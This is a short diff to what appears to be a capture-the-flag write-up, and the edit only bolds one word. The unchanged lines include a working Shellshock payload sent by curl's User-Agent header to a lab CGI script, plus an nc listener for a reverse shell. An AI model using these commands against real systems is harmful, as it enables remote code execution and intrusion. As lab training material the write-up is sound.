@@ -39,7 +39,7 @@ Get a revershell:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/33347aa2-8d52-4ecc-bdd1-eefabc6550f0)
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a66c0774-5e34-43b9-a1e5-522fc5dd4399)
 
-Alternatively, use `curl`: 
+**Alternatively**, use `curl`: 
 + `curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh`
 + `nc -lnvp 5555`
 ```
